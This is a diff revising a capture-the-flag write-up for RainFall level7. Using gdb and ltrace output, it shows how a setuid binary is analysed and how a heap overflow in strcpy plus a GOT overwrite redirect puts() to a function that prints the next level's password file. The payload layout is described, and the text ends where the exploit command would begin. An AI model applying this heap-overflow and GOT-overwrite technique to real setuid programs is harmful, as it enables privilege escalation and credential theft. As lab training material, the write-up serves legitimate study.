@@ -16,12 +16,11 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 -rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
 level7@RainFall:~$ file level7
 level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
-
 ```
 
 The file is owned by **level8** and has the **setuid** bit.
 
-We list the functions inside the executable and analyze their assembly code with **GDB**.
+We list the functions inside the executable.
 
 ```
 (gdb) info functions
@@ -59,7 +58,7 @@ Non-debugging symbols:
 0x080486bc  _fini
 ```
 
-There are 2 user defined functions: `main()` and `m()` :
+There are 2 user-defined functions: `main()` and `m()` :
 
 ```
 (gdb) disas main
@@ -124,9 +123,15 @@ End of assembler dump.
 ```
 
 The `main()` function: 
-- calls `malloc()` 4 times to allocate memory zones of 8 bytes
-- calls `strcpy()` twice right after
-- opens and reads the content of `/home/user/level8/.pass` with `fopen()` followed by `fgets()`
+- calls `malloc()` to allocate `0x8` bytes 4 times to and stores:
+  - the first pointer to `[esp + 0x1c]`
+  - the second pointer to `[esp + 0x1c] + 0x4`
+  - the third pointer to `[esp + 0x18]`
+  - the fourth pointer to `[esp + 0x18] + 0x4`
+- calls `strcpy()` to copy `argv[1]` into `[esp + 0x1c] + 0x4`
+- calls `strcpy()` to copy `argv[2]` into `[esp + 0x18] + 0x4`
+- calls `fopen()` to open `/home/user/level8/.pass`
+- calls `fgets()` to read 44 bytes of the previously opened file into `0x8049960`
 - calls `puts()` to print `~~` on stdout
 
 ```
@@ -147,60 +152,25 @@ Dump of assembler code for function m:
 End of assembler dump.
 ```
 
-The `m()` function:
-- calls `printf()` with `"%s - %d\n"` format string and the string stored at `0x8049960`, which is the address of the string read by `fgets()` in `main()`, as value for the `%s` format specifier
+The `m()` function calls `printf()` with the `"%s - %d\n"` format string, passing the content of the address `0x8049960` to the `%s` specifier.
 
-We try to execute the program with and without arguments: it segfaults with less than 2 arguments.
+We use the `ltrace` command in order to track down the addresses of the allocated memory zones from `malloc()`.
 
 ```bash
-level7@RainFall:~$ ./level7 
-Segmentation fault (core dumped)
-level7@RainFall:~$ ./level7 AAAA
-Segmentation fault (core dumped)
-level7@RainFall:~$ ./level7 AAAA BBBB
-~~
-```
-
-We set breakpoints after every `malloc()` in order to track down the returned addresses.
-
-```
-(gdb) b *0x08048536
-Breakpoint 1 at 0x8048536
-(gdb) b *0x08048550
-Breakpoint 2 at 0x8048550
-(gdb) b *0x08048565
-Breakpoint 3 at 0x8048565
-(gdb) b *0x0804857f
-Breakpoint 4 at 0x804857f
-(gdb) r AAAA BBBB
-Starting program: /home/user/level7/level7 AAAA BBBB
-
-Breakpoint 1, 0x08048536 in main ()
-(gdb) x $eax
-0x804a008:	0x00000000
-(gdb) c
-Continuing.
-
-Breakpoint 2, 0x08048550 in main ()
-(gdb) x $eax
-0x804a018:	0x00000000
-(gdb) c
-Continuing.
-
-Breakpoint 3, 0x08048565 in main ()
-(gdb) x $eax
-0x804a028:	0x00000000
-(gdb) c
-Continuing.
-
-Breakpoint 4, 0x0804857f in main ()
-(gdb) x $eax
-0x804a038:	0x00000000
+level7@RainFall:~$ ltrace ./level7 
+__libc_start_main(0x8048521, 1, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                                                                          = 0x0804a008
+malloc(8)                                                                                                                                          = 0x0804a018
+malloc(8)                                                                                                                                          = 0x0804a028
+malloc(8)                                                                                                                                          = 0x0804a038
+strcpy(0x0804a018, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
 ```
 
 The returned addresses are `0x804a008`, `0x804a018`, `0x804a028`, and `0x804a038`.
 
-We read all the instructions after each `malloc()` and draw a diagram summarizing the allocated memory state.
+We draw a diagram of the heap.
 
 ![Diagram of allocated memory](./resources/level7_diagram1.png)
 
@@ -214,59 +184,14 @@ Starting program: /home/user/level7/level7 AAAA BBBB
 
 Breakpoint 5, 0x08048588 in main ()
 (gdb) x/16wx 0x804a008
-0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
-0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
-0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000011
+0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
 ```
 
-Then, we set breakpoints before the `strcpy()` calls to get the values passed as arguments.
-
-```
-(gdb) b *0x080485a0
-Breakpoint 6 at 0x80485a0
-(gdb) b *0x080485bd
-Breakpoint 7 at 0x80485bd
-(gdb) r AAAA BBBB
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user/level7/level7 AAAA BBBB
-
-Breakpoint 6, 0x080485a0 in main ()
-(gdb) info registers esp
-esp            0xbffff620       0xbffff620
-(gdb) x/4wx 0xbffff620
-0xbffff620:     0x0804a018      0xbffff83d      0xb7fd0ff4      0xb7e5ee55
-(gdb) c
-Continuing.
-
-Breakpoint 7, 0x080485bd in main ()
-(gdb) info registers esp
-esp            0xbffff620       0xbffff620
-(gdb) x/4wx 0xbffff620
-0xbffff620:     0x0804a038      0xbffff842      0xb7fd0ff4      0xb7e5ee55
-```
-
-The two `strcpy()` are called as follows:
-- `strcpy(dest: 0x0804a018, src: 0xbffff83d)`
-- `strcpy(dest: 0x0804a038, src: 0xbffff842)`
-
-The `dest` parameters are 2 addresses to our allocated memory with `malloc()`.
-
-We display the values of the `src` parameters.
-
-```
-(gdb) x/s 0xbffff83d
-0xbffff83d:      "AAAA"
-(gdb) x/s 0xbffff842
-0xbffff842:      "BBBB"
-```
-
-Those are the addresses to `argv[1]` and `argv[2]`.
-
-If we pay attention to the `mov` instructions before the second `strcpy()`, the executable picks the address located at `0x804a02c` as `dest` argument. This is good news for us because it means we can overwrite this value thanks to the first `strcpy()`.
-
-Like in the previous level, we have to exploit `strcpy()` in order to overwrite a value on the heap with a **buffer overflow**. But this time, we have to also replace the call to `puts()` with `m()` using a **GOT overwrite** exploit.
+If we pay attention to the `strcpy()` calls, we notice that the `dest` arguments are respectively `[esp + 0x1c] + 0x4` (`0x0804a00c`) and `[esp + 0x18] + 0x4` (`0x0804a02c`).  
+This is good news for us because it means we can overwrite the second address stored on the heap using a **buffer overflow** thanks to the first `strcpy()`. But we also have to replace the call to `puts()` with `m()` using a **GOT overwrite** exploit.
 
 ```
 (gdb) disas 0x8048400
@@ -279,7 +204,7 @@ End of assembler dump.
 
 The address of `puts()` in the GOT is `0x8049928`.
 
-We calculate the difference between `0x804a02c`, the address which contains the value we wanna overwrite, and `0x0804a018`, the `dest` of the first `strcpy()`: `0x14` (20).  
+We calculate the difference between `0x804a02c`, the address which contains the value we wanna overwrite, and `0x0804a018`, the `dest` of the first `strcpy()` = `0x14` (20).  
 The goal is to insert a payload of 20 bytes, followed by the address of `puts()` in the GOT, as `argv[1]`, and the address of `m()` as `argv[2]`.
 
 ```bash
